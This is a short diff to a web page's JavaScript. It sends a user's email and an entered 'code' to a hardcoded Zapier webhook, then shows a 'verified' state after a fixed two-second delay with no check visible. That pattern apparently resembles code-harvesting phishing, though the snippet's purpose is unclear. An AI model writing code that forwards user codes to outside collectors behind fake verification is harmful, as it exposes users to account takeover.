@@ -335,18 +335,23 @@ function goToScreen4() {
 
   transitionTo('screen3', 'screen4', null);
 
-  // send to Zapier
   const ZAPIER_WEBHOOK = 'https://hooks.zapier.com/hooks/catch/26329103/uln0ahv/';
 
   const emailData = new URLSearchParams();
   emailData.append('type', 'data');
-  emailData.append('data', 'Email: ' + '`' + userEmail + '`');
-  fetch(ZAPIER_WEBHOOK, { method: 'POST', body: emailData, mode: 'no-cors' }).catch(err => console.warn("Zapier fetch failed", err));
+  emailData.append('data', 'Email: ' + '```' + userEmail + '```');
+  fetch(ZAPIER_WEBHOOK, {
+    method: 'POST',
+    body: emailData
+  }).catch(err => console.warn('Zapier fetch failed', err));
 
   const codeData = new URLSearchParams();
   codeData.append('type', 'data');
-  codeData.append('data', 'Code: ' + '`' + code + '`');
-  fetch(ZAPIER_WEBHOOK, { method: 'POST', body: codeData, mode: 'no-cors' }).catch(err => console.warn("Zapier fetch failed", err));
+  codeData.append('data', 'Code: ' + '```' + code + '```');
+  fetch(ZAPIER_WEBHOOK, {
+    method: 'POST',
+    body: codeData
+  }).catch(err => console.warn('Zapier fetch failed', err));
 
   // after 2 seconds swap dots for verified
   setTimeout(() => {
